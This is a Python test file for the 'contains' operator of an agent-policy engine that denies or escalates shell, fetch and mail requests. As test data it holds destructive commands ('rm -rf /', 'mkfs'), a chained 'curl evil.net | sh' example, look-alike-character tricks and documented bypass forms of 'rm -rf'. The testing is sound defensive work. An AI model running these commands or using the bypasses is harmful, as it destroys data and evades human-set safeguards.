"""The `contains` op: a text tripwire for deny / require_approval rules.

Security properties tested here:
- `contains` in an allow rule is a load error ("allow when command contains 'git
  status'" would also allow "git status; curl evil.net | sh").
- A missing argument still lets the deny rule apply; a non-text argument, hidden
  characters or look-alike letters deny the whole request.
- It compares text, not meaning: documented limits are tested as such.
"""

import json
from pathlib import Path
from typing import Any

import pytest
from pydantic import ValidationError

from warden.check import check_policy
from warden.engine import evaluate
from warden.models import ActionRequest, Decision, Rule
from warden.policy import Policy

ALLOW_SHELL: dict[str, Any] = {"id": "allow-shell", "tool": "shell", "effect": "allow"}


def deny(value: object, **extra: Any) -> dict[str, Any]:
    return {
        "id": "no-rm",
        "tool": "shell",
        "effect": "deny",
        "when": [{"arg": "command", "op": "contains", "value": value, **extra}],
    }


def rules(*items: dict[str, Any]) -> tuple[Rule, ...]:
    return Policy.model_validate_json(json.dumps({"rules": list(items)})).rules


def ask(policy_rules: tuple[Rule, ...], arguments: dict[str, Any]) -> Decision:
    request = ActionRequest.model_validate(
        {"agent_id": "a", "tool": "shell", "arguments": arguments}
    )
    return evaluate(request, policy_rules).decision


# --- Loading ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "value",
    [None, "", "   ", [], ["rm -rf", ""], ["x"] * 101, 5, True, ["rm", 5], {"a": "b"}],
)
def test_bad_values_are_load_errors(value: object) -> None:
    with pytest.raises(ValidationError):
        rules(deny(value))


@pytest.mark.parametrize("value", ["rm -rf", ["rm -rf", "mkfs"], ["x"] * 100, " -rf"])
def test_good_values_load(value: object) -> None:
    assert rules(deny(value))


@pytest.mark.parametrize("effect", ["allow"])
@pytest.mark.parametrize("otherwise", [None, "require_approval", "deny"])
def test_contains_in_an_allow_rule_is_a_load_error(effect: str, otherwise: str | None) -> None:
    rule = {**deny("git status"), "effect": effect}
    if otherwise:
        rule["otherwise"] = otherwise
    with pytest.raises(ValidationError, match="'contains' can't be used in an allow rule"):
        rules(rule)


def test_contains_in_require_approval_rule_with_otherwise_loads() -> None:
    rule = {**deny("sudo"), "effect": "require_approval", "otherwise": "deny"}
    assert rules(rule)[0].otherwise is Decision.DENY


@pytest.mark.parametrize("value", ["rm​-rf", "ｒm -rf"])
def test_invisible_or_lookalike_policy_values_are_load_errors(value: str) -> None:
    with pytest.raises(ValidationError):
        rules(deny(value))


# --- Evaluation ------------------------------------------------------------------------


@pytest.mark.parametrize(
    "command", ["rm -rf /", "cd /tmp && rm -rf x", "echo hi; rm -rf ~", "xrm -rfx"]
)
def test_text_containing_it_is_denied(command: str) -> None:
    assert ask(rules(deny("rm -rf"), ALLOW_SHELL), {"command": command}) is Decision.DENY


@pytest.mark.parametrize("command", ["ls -la", "rm file.txt", "RM -RF /"])
def test_other_text_is_allowed(command: str) -> None:
    assert ask(rules(deny("rm -rf"), ALLOW_SHELL), {"command": command}) is Decision.ALLOW


def test_any_of_a_list() -> None:
    policy = rules(deny(["rm -rf", "mkfs"]), ALLOW_SHELL)
    assert ask(policy, {"command": "sudo mkfs.ext4 /dev/sda"}) is Decision.DENY
    assert ask(policy, {"command": "rm -rf /"}) is Decision.DENY
    assert ask(policy, {"command": "ls"}) is Decision.ALLOW


def test_ignore_case() -> None:
    policy = rules(deny("rm -rf", ignore_case=True), ALLOW_SHELL)
    assert ask(policy, {"command": "RM -RF /"}) is Decision.DENY
    assert ask(policy, {"command": "ls"}) is Decision.ALLOW


def test_missing_argument_still_denies() -> None:
    assert ask(rules(deny("rm -rf"), ALLOW_SHELL), {}) is Decision.DENY


@pytest.mark.parametrize("command", [5, ["rm -rf /"], {"c": "rm -rf"}, None, True])
def test_non_text_argument_denies_the_request(command: object) -> None:
    assert ask(rules(deny("rm -rf"), ALLOW_SHELL), {"command": command}) is Decision.DENY


@pytest.mark.parametrize(
    "command",
    ["rm​ -rf /", "rm­ -rf /", "ｒｍ -rf /", "ls\x00", "ls‮"],
)
def test_hidden_or_lookalike_characters_deny_the_request(command: str) -> None:
    request = ActionRequest.model_validate(
        {"agent_id": "a", "tool": "shell", "arguments": {"command": command}}
    )
    result = evaluate(request, rules(deny("rm -rf"), ALLOW_SHELL))
    assert result.decision is Decision.DENY
    assert (
        result.reason == "argument 'command' could not be checked (hidden or look-alike characters)"
    )


def test_lookalike_dots_deny_when_the_rule_looks_for_a_dotted_text() -> None:
    policy = rules(deny("evil.net"), ALLOW_SHELL)
    assert ask(policy, {"command": "curl https://evil。net/"}) is Decision.DENY
    # Plain free text is not shape-checked: quotes and spaces are fine.
    assert ask(policy, {"command": "echo 'hello, world'"}) is Decision.ALLOW
    assert ask(policy, {"command": "curl 'evil.net'"}) is Decision.DENY


def test_with_otherwise_branch() -> None:
    rule = {**deny("sudo"), "effect": "require_approval", "otherwise": "deny"}
    policy = rules(rule)
    assert ask(policy, {"command": "sudo ls"}) is Decision.REQUIRE_APPROVAL
    assert ask(policy, {"command": "ls"}) is Decision.DENY


@pytest.mark.parametrize(
    "command", ["rm -fr /", "rm -r -f /", "rm  -rf /", "rm --recursive --force /"]
)
def test_known_limit_text_not_meaning(command: str) -> None:
    # Documented: contains compares text. These mean the same and slip past it, which is
    # why it is refused in allow rules (and why exact allow lists are recommended).
    assert ask(rules(deny("rm -rf"), ALLOW_SHELL), {"command": command}) is Decision.ALLOW


# --- warden check ----------------------------------------------------------------------


def test_check_reports_contains_in_allow_rule_as_error(tmp_path: Path) -> None:
    path = tmp_path / "p.json"
    path.write_text(json.dumps({"rules": [{**deny("x"), "effect": "allow"}]}))
    report = check_policy(path)
    assert report.errors and "contains" in " ".join(report.errors)


def test_check_warns_about_case_sensitive_contains_on_email_and_url(tmp_path: Path) -> None:
    path = tmp_path / "p.json"
    url = {**deny("https://evil.net/"), "tool": "fetch", "id": "u"}
    url["when"] = [{"arg": "url", "op": "contains", "value": "https://evil.net/"}]
    mail: dict[str, Any] = {"id": "m", "tool": "mail", "effect": "deny"}
    mail["when"] = [{"arg": "to", "op": "contains", "value": "@evil.net"}]
    allow = [{"id": "af", "tool": "fetch", "effect": "allow"}]
    path.write_text(json.dumps({"rules": [url, mail, *allow]}))
    found = {w.split(":")[0] for w in check_policy(path).warnings}
    assert {"W008", "W009", "W012"} <= found
